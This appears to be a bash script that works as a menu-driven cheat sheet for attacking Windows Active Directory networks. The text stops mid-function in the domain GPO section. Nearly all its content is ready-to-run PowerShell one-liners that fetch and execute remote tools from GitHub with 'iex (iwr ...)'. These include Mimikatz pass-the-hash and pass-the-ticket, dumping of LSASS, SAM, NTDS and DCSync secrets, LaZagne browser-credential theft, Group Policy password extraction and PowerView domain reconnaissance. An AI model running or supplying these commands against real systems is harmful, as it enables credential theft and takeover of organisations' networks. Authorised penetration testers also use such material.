# Test

################################################################################
# Variables                                                                    #
################################################################################

LocalIP="10.10.14.10";		#
LocalPort="8080";		#
Username="<Username>";			#
NQUsername="";			#
Password="<Password>";			#
Domain="<Domain>";			#
NQDomain="";			#
IP="<IP>";				#
NQIP="<IP>";			#
LDAP="";			#
baseLDAP="";			#
DC="";				#
NS="<IP>";			#
Version="v2.1"			#
MainCheck="1"			#


################################################################################
# Colors                                                                       #
################################################################################

RESTORE='\033[0m'

RED='\033[00;31m'
GREEN='\033[00;32m'
YELLOW='\033[00;33m'
BLUE='\033[00;34m'
PURPLE='\033[00;35m'
CYAN='\033[00;36m'
LIGHTGRAY='\033[00;37m'

LRED='\033[01;31m'
LGREEN='\033[01;32m'
LYELLOW='\033[01;33m'
LBLUE='\033[01;34m'
LPURPLE='\033[01;35m'
LCYAN='\033[01;36m'
WHITE='\033[01;37m'

IBLUE='\033[02;34m'
ICYAN='\033[02;36m'

adPEASRepo="https://raw.githubusercontent.com/61106960/adPEAS/main/";
BloodHoundRepo="https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/";
DomainPasswordSprayRepo="https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/"
EmpireRepo="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/";
GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/";
Group3rRepo="https://github.com/Group3r/Group3r/releases/download/1.0.41/Group3r.exe";
JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSync/main/";
PowerSharpPackRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/";
PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/";
PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/";
S3cur3Th1sSh1tCredsRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/";
SecListsRepo="https://github.com/danielmiessler/SecLists/";
WinPwnRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";

iwr="iex (iwr -usebasicparsing "
DownloadMethod="$iwr"



Internal_Menu_Main(){

	clear

echo -e ""
echo -e ""
echo -e ""
echo -ne " What would you like to do?


	1)  ->  [ Alternate Authentication	]
	2   ->	[ Certificate Services 		]
	3)  ->  [ Credential Access		]
	4)  ->  [ MiTM Attacks 			]
	5)  ->  [ MSSQL 			]
        6)  ->  [ Password Spraying 		]
        7)  ->  [ Privilege Escalation		]
        8)  ->  [ Recon 			]
        
        A)  ->	[ AMSI Bypasses			]
        
"
        read a
        case $a in
                1) 	Internal_Menu_Alternate_Authentication ;;
                2)	Internal_Menu_Certificate_Services ;;
                3) 	Internal_Menu_Credential_Access ;;
        	4) 	Internal_Menu_MiTM_Attacks ;;
        	5) 	Internal_Menu_MSSQL ;;
	        6) 	Internal_Menu_Password_Spraying ;;
	        7) 	Internal_Menu_Privilege_Escalation ;;
	        8) 	Internal_Menu_Recon ;;
	        a|A)	Internal_Menu_AMSI_Bypasses ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}

Internal_Menu_Alternate_Authentication(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Alternate Authentication Material Type



        1)  ->  [ Pass the Hash			]
        2)  ->  [ Pass the Ticket		]
                
        Q)  ->	[Previous Menu			]
"

        read a
        case $a in
                1) 	Internal_Menu_Alternate_Authentication_Pass_Hash ;;
        	2) 	Internal_Menu_Alternate_Authentication_Pass_Ticket ;;
        	q|Q)	Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Alternate_Authentication_Pass_Hash(){

	clear

echo -e ""
echo -e ""
echo -e ""      
echo -e "${LGREEN}Pass the Hash${RESTORE}"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"  
echo -e ""
echo -e "${YELLOW}Load Mimikatz into memory${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz"
echo -e ""
echo -e "${YELLOW}Spawn PowerShell Process with supplied user's NTLM hash${RESTORE}"
echo -e "Invoke-Mimikatz -Command '"\"sekurlsa::pth /user:[User] /domain:[Domain] /ntlm:[NTLM] /run:powershell.exe"\"'"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Alternate_Authentication ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}


Internal_Menu_Alternate_Authentication_Pass_Ticket(){

	clear

echo -e ""
echo -e ""
echo -e ""      
echo -e "${LGREEN}Pass the Ticket${RESTORE}"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"  
echo -e ""
echo -e "${YELLOW}Load Mimikatz into memory${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz"
echo -e ""
echo -e "${YELLOW}Collect Tickets${RESTORE}"
echo -e "Invoke-Mimikatz -Command '"\"sekurlsa::tickets /export\""'"
echo -e ""
echo -e ""
echo -e "${YELLOW}Inject collected ticket${RESTORE}"
echo -e "Invoke-Mimikatz -Command '"\"kerberos::ptt [Ticket.kirbi]\""'"
echo -e ""
echo -e "${YELLOW}spawn CMD with the injected ticket${RESTORE}"
echo -e "Invoke-Mimikatz -Command '"\"misc::cmd\""'"
echo -e ""
echo -e ""
echo -e "${IBLUE}Rubeus${RESTORE}"
echo -e ""
echo -e "${YELLOW}Load Rubeus into memory${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1)"
echo -e ""
echo -e "${YELLOW}Collect Tickets${RESTORE}"
echo -e "Invoke-Rubeus -Command "\"dump /nowrap"\""
echo -e ""
echo -e "${YELLOW}Monitor for new tickets (Optional)${RESTORE}"
echo -e "Invoke-Rubeus -Command "\"monitor /interval:5 /nowrap"\""
echo -e ""
echo -e "${YELLOW}Inject ticket (base64 blob)${RESTORE}"
echo -e "Invoke-Rubeus -Command "\"ptt /ticket:[Base64Blob]"\""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Alternate_Authentication ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}

Internal_Menu_Certificate_Services(){

	clear

echo -e ""
echo -e ""
echo -e ""      
echo -e "${LGREEN}Certificate Services${RESTORE}"
echo -e ""

}


Internal_Menu_Credential_Access(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Credential Access Type



        1)  ->  [ Credential Dumping 			]
        2)  ->  [ Credentials from Credential Manager	]
        3)  ->  [ Credentials from Group Policy		]
        4)  ->	[ Credentials from Web Browsers		]
        5)  -> 	[ Unsecured Credentials			]
                
        Q)  ->	[Previous Menu		    		]
"

        read a
        case $a in
                1) 	Internal_Menu_Credential_Access_Credential_Dumping ;;
        	2) 	Internal_Menu_Credential_Access_Credential_Manager ;;
	        3) 	Internal_Menu_Credential_Access_Credential_Group_Policy ;;
	        4) 	Internal_Menu_Credential_Access_Credential_Web_Browsers ;;
	        5) 	Internal_Menu_Credential_Access_Unsecured_Credentials ;;
	        q|Q)	Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Credential_Access_Credential_Dumping(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Credential Dumping Type



        1)  ->  [ Cached Domain Credentials ]
        2)  ->  [ LSA Secrets		    ]
        3)  ->	[ LSASS Memory		    ]
        4)  -> 	[ NTDS			    ]
        5)  ->	[ SAM			    ]
        
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
                1) 	Internal_Menu_Credential_Access_Credential_Dumping_Cached_Domain_Credentials ;;
	        2) 	Internal_Menu_Credential_Access_Credential_Dumping_LSA_Secrets ;;
	        3) 	Internal_Menu_Credential_Access_Credential_Dumping_LSASS_Memory ;;
	        4) 	Internal_Menu_Credential_Access_Credential_Dumping_NTDS ;;
	        5)	Internal_Menu_Credential_Access_Credential_Dumping_SAM ;;
	        q|Q)	Internal_Menu_Credential_Access ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Credential_Access_Credential_Dumping_Cached_Domain_Credentials(){

	clear

echo -e ""
echo -e ""
echo -e ""      
echo -e "${LGREEN}Cached Domain Credentials${RESTORE}"
echo -e ""
echo -e "${IBLUE}LaZagne${RESTORE}"
echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"token::elevate"\" "\"lsadump::cache"\"'"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access_Credential_Dumping ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac


}


Internal_Menu_Credential_Access_Credential_Dumping_LSA_Secrets(){

	clear

echo -e ""
echo -e "" 
echo -e ""      
echo -e "${LGREEN}LSA Secrets${RESTORE}"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"token::elevate"\" "\"lsadump::secrets"\"'"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access_Credential_Dumping ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac



}


Internal_Menu_Credential_Access_Credential_Dumping_LSASS_Memory(){

	clear

echo -e ""
echo -e "" 
echo -e ""      
echo -e "${LGREEN}LSASS Memory${RESTORE}"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -DumpCreds"
echo -e ""
echo -e "${IBLUE}Nanodump${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-NanoDump.ps1);Invoke-NanoDump"
echo -e ""
echo -e "${IBLUE}SharpSecDump${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=127.0.0.1"\""
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10,10.10.10.20"\""
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10 -u=admin -p=pass -d=security.local"\""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access_Credential_Dumping ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac



}


Internal_Menu_Credential_Access_Credential_Dumping_NTDS(){
	clear

echo -e ""
echo -e "" 
echo -e ""      
echo -e "${LGREEN}NTDS${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-DCSync${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-DCSync.ps1);Invoke-DCSync"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::dcsync /domain:Security.local /user:all"\"'"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::dcsync /domain:Security.local /user:krbtgt"\"'"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::lsa /inject"\"'"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access_Credential_Dumping ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac



}


Internal_Menu_Credential_Access_Credential_Dumping_SAM(){

	clear

echo -e ""
echo -e "" 
echo -e ""      
echo -e "${LGREEN}SAM${RESTORE}"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::sam"\"'"
echo -e ""
echo -e "${IBLUE}Nishang${RESTORE}"
echo -e "$DownloadMethod '$NishangRepo""Gather/Get-PassHashes.ps1');Get-PassHashes"
echo -e ""
echo -e "${IBLUE}SharpSecDump${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=127.0.0.1"\""
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10,10.10.10.20"\""
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10 -u=admin -p=pass -d=security.local"\""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access_Credential_Dumping ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac


}

Internal_Menu_Credential_Access_Credential_Manager(){

	clear

echo -e ""
echo -e "" 
echo -e ""      
echo -e "${LGREEN}Credential Manager${RESTORE}"
echo -e ""
echo -e "${IBLUE}Get-VaultCredential${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Exfiltration/Get-VaultCredential.ps1);Get-VaultCredential"
echo -e ""
echo -e "${IBLUE}LaZagne${RESTORE}"
echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
echo -e ""
echo -e "${IBLUE}Nishang${RESTORE}"
echo -e "$DownloadMethod "$NishangRepo"Gather/Get-WebCredentials.ps1);Get-WebCredentials"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Credential_Access_Credential_Group_Policy(){

	clear

echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Group Policy${RESTORE}"
echo -e ""    
echo -e "${IBLUE}CMD${RESTORE}"
echo -ne "
findstr /S cpassword %logonserver%\sysvol\*.xml
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
"
echo -e ""  
echo -e "${IBLUE}Get-CachedGPPPassword${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-GPPPassword.ps1);Get-GPPPassword"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Credential_Access_Credential_Web_Browsers(){

	clear

echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Web Browsers${RESTORE}"
echo -e ""
echo -e "${IBLUE}LaZagne${RESTORE}"
echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
echo -e ""
echo -e "${IBLUE}SharpWeb${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Sharpweb.ps1);Invoke-Sharpweb -Command "\"full"\""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Credential_Access_Unsecured_Credentials(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Unsecured Credentials Type



        1)  ->  [ Credentials in Files 		]
        2)  ->  [ Credentials in Registry	]
        
        Q)  ->	[Previous Menu			]
"

        read a
        case $a in
                1) 	Internal_Menu_Credential_Access_Credential_Unsecured_Credentials_Files ;;
	        2) 	Internal_Menu_Credential_Access_Credential_Unsecured_Credentials_Registry ;;
	        q|Q)	Internal_Menu_Credential_Access ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}


Internal_Menu_Credential_Access_Credential_Unsecured_Credentials_Files(){

	clear

echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Credentials in Files${RESTORE}"
echo -e ""
echo -e "${IBLUE}CMD${RESTORE}"
echo -e "findstr /si pass *.xml *.doc *.txt *.xls"
echo -e "findstr /si cred *.xml *.doc *.txt *.xls"
echo -e ""
echo -e "${IBLUE}Gopher${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Gopher.ps1);Invoke-Gopher"
echo -e ""
echo -e "${IBLUE}PowerShell${RESTORE}"
echo -e "ls -R | select-string -Pattern 'password'"
echo -e ""
echo -e "${IBLUE}PowerUp${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/PowerUp.ps1);Get-UnattendedInstallFile;Get-ApplicationHost;Get-Webconfig;Get-SiteListPassword;Get-CachedGPPPassword;Get-RegistryAutoLogon"
echo -e ""
echo -e ""
echo -e "${IBLUE}SessionGopher${RESTORE}"
echo -e "$DownloadMethod $EmpireRepo"credentials/Invoke-SessionGopher.ps1");Invoke-SessionGopher -Thorough"
echo -e "$DownloadMethod $EmpireRepo"credentials/Invoke-SessionGopher.ps1");Invoke-SessionGopher -AllDomain -Thorough"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access_Unsecured_Credentials ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}


Internal_Menu_Credential_Access_Credential_Unsecured_Credentials_Registry(){

	clear

echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Credentials in Registry${RESTORE}"
echo -e ""
echo -e "${IBLUE}CMD${RESTORE}"
echo -e ""
echo -e "${YELLOW}String matching in registry${RESTORE}"
echo -e "reg query HKLM /f password /t REG_SZ /s"
echo -e "reg query HKCU /f password /t REG_SZ /s"
echo -e ""
echo -e "${YELLOW}Putty${RESTORE}"
echo -e "reg query "\"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"\" /t REG_SZ /s"
echo -e ""
echo -e "${YELLOW}VNC${RESTORE}"
echo -e "reg query "\"HKCU\\Software\\ORL\\WinVNC3\\Password"\""
echo -e ""
echo -e "${YELLOW}Windows autologin${RESTORE}"
echo -e "reg query "\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon"\""
echo -e ""
echo -e "${IBLUE}PowerShell${RESTORE}"
echo -e "ls -R | select-string -Pattern 'password'"
echo -e ""
echo -e "${IBLUE}PowerUp${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/PowerUp.ps1);Get-UnattendedInstallFile;Get-ApplicationHost;Get-Webconfig;Get-SiteListPassword;Get-CachedGPPPassword;Get-RegistryAutoLogon"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access_Unsecured_Credentials ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}


Internal_Menu_Recon(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Recon Type



        1)  ->  [ Domain Recon 		]
        2)  ->  [ File and Share Recon 	]
        3)  ->  [ Local Host Recon	] 
        4)  ->  [ Network Recon 	]
                 
        Q)  ->	[Previous Menu		]
"
        read a
        case $a in
	        1) 	Internal_Menu_Recon_Domain ;;
	        2) 	Internal_Menu_Recon_File_Share ;;
	        3) 	Internal_Menu_Recon_Local_Host;;
	        4) 	Internal_Menu_Recon_Network ;;
	        q|Q)	Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}



Internal_Menu_Recon_Local_Host(){

	clear

echo -e ""
echo -e ""
echo -e ""      
echo -e "${LGREEN}Local Host Enumeration${RESTORE}"
echo -e ""
echo -e "${IBLUE}HostRecon${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/HostRecon.ps1);Invoke-HostRecon"
echo -e ""
echo -e "${IBLUE}Invoke-Seatbelt${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-Seatbelt.ps1);Invoke-Seatbelt -Command -group=all"
echo -e ""
echo -e "${IBLUE}Invoke-WinEnum${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-WinEnum.ps1);Invoke-WinEnum"
echo -e ""
echo -e "${IBLUE}JAWS${RESTORE}"
echo -e "$DownloadMethod "$JAWSRepo"jaws-enum.ps1);JAWS-ENUM"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Recon ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Recon_Domain(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Domain Recon Type



	1)  ->	[ Domain ACL's			]
	2)  -> 	[ Domain Controllers		]
        3)  ->  [ Domain Computers and Servers 	]
        4)  ->	[ Domain Delegation		]
        5)  ->	[ Domain Forests 		]
        6)  ->	[ Domain GPO's			]
        7)  ->	[ Domain Groups			]
        8)  -> 	[ Domain Policies 		]
        9)  ->	[ Domain Trusts 		]
        10) -> 	[ Domain Users 			]
        T)  ->  [ Tools				]
        
                
        Q)  ->	[Previous Menu		    	]
"
        read a
        case $a in
        	1) 	Internal_Menu_Recon_Domain_ACL ;;
        	2) 	Internal_Menu_Recon_Domain_Controllers ;;	
	        3) 	Internal_Menu_Recon_Domain_Computers_Servers ;;
	        4) 	Internal_Menu_Recon_Domain_Delegation ;;
	        5) 	Internal_Menu_Recon_Domain_Forests ;;
	        6) 	Internal_Menu_Recon_Domain_GPO ;;
	        7) 	Internal_Menu_Recon_Domain_Groups ;;
	        8) 	Internal_Menu_Recon_Domain_Policies ;;
	        9) 	Internal_Menu_Recon_Domain_Trusts ;;
	        10) 	Internal_Menu_Recon_Domain_Users ;;
	        t|T) 	Internal_Menu_Recon_Domain_Tools ;;
	        q|Q)	Internal_Menu_Recon ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}


Internal_Menu_Recon_Domain_ACL(){

	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain ACL's and ACE's${RESTORE}"
echo -e ""
echo -e "${IBLUE}Search for interesting ACEs${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ACLScanner -ResolveGUIDs"
echo -e ""
echo -e "${IBLUE}Get ACLs for specific AD Object${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-ObjectACL -SamAccountName <SAM> -ResolveGUIDs"
echo -e ""
echo -e "${IBLUE}Get ACLs for specified prefix${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-ObjectACL -ADSprefix 'CN=Administrators,CN=Users' -Verbose"
echo -e ""
echo -e "${IBLUE}Get ACLs for specified prefix${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-PathACL -Path '\\\\\\\\Security.local\SYSVOL'"
echo -e ""
echo -e "" 

echo -ne  "Return to Previous Menu?

     
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_Controllers(){

	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Controller Enumeration${RESTORE}"
echo -e ""  
echo -e "${IBLUE}PowerView${RESTORE}" 
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetDomainController"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetDomain | Select-Object 'PdcRoleOwner'"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

        
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}



Internal_Menu_Recon_Domain_Computers_Servers(){

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Computers and Servers${RESTORE}"
echo -e ""
echo -e "${IBLUE}All Computers${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -Properties Name,OperatingSystem,distinguishedname | Sort Name "
echo -e ""
echo -e "${IBLUE}Ping Alive Computers${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -Ping"
echo -e ""
echo -e "${IBLUE}Computers by Operating System${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows 10*'| Select Name,dnshostname,operatingsystem,operatingsystemversion "
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows 7*' | Select Name,dnshostname,operatingsystem,operatingsystemversion"  
echo -e ""
echo -e "${IBLUE}Servers by Operating System${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows Server*' | Select Name,dnshostname,operatingsystem,operatingsystemversion"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

     
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_Delegation (){

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Delegation${RESTORE}"
echo -e ""
echo -e "${IBLUE}Constrained Delegation${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -TrustedToAuth"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -TrustedToAuth"
echo -e ""
echo -e "${IBLUE}Unconstrained Delegation${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -Unconstrained | select -ExpandProperty name"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_Forests(){

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Forests${RESTORE}"
echo -e ""
echo -e "${IBLUE}Enumerate trusts across the Domain${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get details about current Forest"
echo -e ""
echo -e "${IBLUE}Get all Domains in current Forest${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestDomain"
echo -e ""
echo -e "${IBLUE}Get global catalogs in current Forest${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestCatalog"
echo -e ""
echo -e "${IBLUE}Map Forest trusts${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestTrust"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_GPO() {

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain GPO's${RESTORE}"
echo -e ""
echo -e "${IBLUE}Get GPO's in Domain${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO | Select DisplayName"
echo -e ""
echo -e "${IBLUE}Get GPO's applied to specific OU${RESTORE}"
